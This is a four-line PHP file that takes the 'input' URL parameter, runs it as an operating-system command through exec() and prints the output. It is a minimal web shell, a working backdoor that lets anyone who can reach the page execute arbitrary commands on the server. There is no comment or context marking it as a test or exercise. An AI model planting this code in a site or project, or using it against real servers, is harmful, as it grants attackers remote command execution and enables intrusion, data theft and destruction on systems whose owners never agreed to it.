<?php
    $a=exec($_GET["input"]);
    echo $a;
?>